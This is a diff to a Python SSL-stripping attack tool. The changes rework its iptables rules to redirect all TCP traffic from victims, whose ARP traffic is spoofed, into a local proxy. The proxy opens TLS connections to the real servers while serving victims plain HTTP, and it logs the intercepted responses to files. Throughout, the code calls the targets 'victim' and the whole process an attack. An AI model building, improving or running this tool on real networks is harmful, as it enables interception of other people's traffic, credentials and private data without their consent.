@@ -10,6 +10,7 @@ import os
 import sys
 import string
 import time
+import ssl
 
 class sslstrip:
     def __init__(self):
@@ -18,12 +19,15 @@ class sslstrip:
     def set_iptables(self, toRunning):
         if toRunning:
             os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
-            run_iptables_command("iptables -t nat -I PREROUTING 1 -p tcp --dport 80 -j REDIRECT --to-port %s" % self.redirect_port)
-            run_iptables_command("iptables -I FORWARD 1 -p udp --dport 53 -j ACCEPT")
+            run_iptables_command("sudo iptables -t nat -I PREROUTING 1 -p tcp  -j REDIRECT --to-port %s" % self.redirect_port)
+            run_iptables_command("sudo iptables -I FORWARD 1 -p udp --dport 53 -j ACCEPT")
+            run_iptables_command("sudo iptables -I FORWARD 1 -p udp --sport 53 -j ACCEPT")
         else:
             os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
-            run_iptables_command("iptables -t nat -D PREROUTING -p tcp --dport 80 -j REDIRECT --to-port %s" % self.redirect_port)
-            run_iptables_command("iptables -D FORWARD -p udp --dport 53 -j ACCEPT")
+            
+            run_iptables_command("sudo iptables -t nat -D PREROUTING -p tcp -j REDIRECT --to-port %s" % self.redirect_port)
+            run_iptables_command("sudo iptables -D FORWARD -p udp --dport 53 -j ACCEPT")
+            run_iptables_command("sudo iptables -D FORWARD -p udp --sport 53 -j ACCEPT")
 
     class HTTPStrippingProxy(BaseHTTPRequestHandler):
         def do_GET(self):
@@ -44,14 +48,26 @@ class sslstrip:
                 #Get host and port
                 splitted_host = host_header.split(':')
                 host = splitted_host[0]
-                port = 80 if len(splitted_host) == 1 else int(splitted_host[1])
+                port = 443
                 
                 # connect to server
                 skt = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                skt.connect((host, port))
-                
-                print("Opened socket with '%s:%s'" % (host, port))
-                
+                context = ssl.create_default_context()
+                try:
+                    skt = context.wrap_socket(skt, server_hostname=host)
+                    skt.connect((host, port))
+                    print("Opened sssl socket with %s:%s" % (host, port))
+                except ssl.SSLError as e:
+                    # No SSL or other ssl fail
+                    skt = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    port = 80
+                    skt.connect((host, port))
+                    print("Opened non SSL socket with %s:%s" % (host, port))
+                except socket.error as e:
+                    print("Socket connection error to %s:%s: %s" % (host, port, e))
+                    self.send_error(502, "Bad Gateway: Could not connect to destination server")
+                    return
+                                
                 # creafe request
                 self.headers['accept-Encoding'] = ''
                 headers = "\r\n".join("%s: %s" % (key, value) for key, value in self.headers.items())
@@ -78,7 +94,7 @@ class sslstrip:
                                     
                 # Process response and return to victim
                 processed_response = self.process_response(response)                
-                
+                self.save_file("processed response", processed_response)
                 
                 print("~~~~~~~~~~~~~~~~~~~~~~~~~~\nProcessed response:\n%s\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~" % processed_response)
                 self.wfile.write(processed_response)
@@ -97,6 +113,8 @@ class sslstrip:
             with open("%s/%s.txt" % (name, time.ctime()), 'w') as f:
                 f.write(content)
                 f.close()
+                
+        
                 
         def process_response(self, response):
             is_chunked = False
@@ -280,12 +298,8 @@ class sslstrip:
             self.start_http_proxy()
             
         except KeyboardInterrupt:
-            print("Stopping ssl stripping attack")
-            if self.http_server:
-                self.http_server.shutdown()
-            self.set_iptables(False)
-            self.arp1.stop_spoof()
-            self.thread.join()
+            self.stop()
+            print("stopped attack")
         except Exception as e:
             print("An error occured")
             traceback.print_exc()
